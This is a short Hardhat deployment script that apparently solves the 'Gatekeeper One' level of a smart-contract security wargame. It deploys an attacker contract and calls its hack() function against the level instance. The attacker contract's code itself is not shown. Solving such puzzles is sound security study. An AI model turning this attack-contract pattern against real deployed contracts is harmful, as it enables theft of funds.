const {
    GATEKEEPER_ONE_INSTANCE_ADDRESS,
    logStartingLevel,
    logSuccessfullyLevel,
    logInstanceAddressIsNull,
    logInstanceAddress,
    logTransactionLink
} = require('./utils');

async function main(levelName) {
    logStartingLevel(levelName);

    if (!GATEKEEPER_ONE_INSTANCE_ADDRESS) {
        logInstanceAddressIsNull(levelName);
        return;
    }
    logInstanceAddress(levelName, GATEKEEPER_ONE_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("GatekeeperOne");
    const contract = factory.attach(GATEKEEPER_ONE_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("GatekeeperOneAttacker");
    const attackerContract = await attackerFactory.deploy();
    await attackerContract.deployed();

    const tx = await attackerContract.hack(contract.address, 1, 1000);
    logTransactionLink(tx.hash);
    await tx.wait(1);

    logSuccessfullyLevel(levelName);
}

module.exports = main;
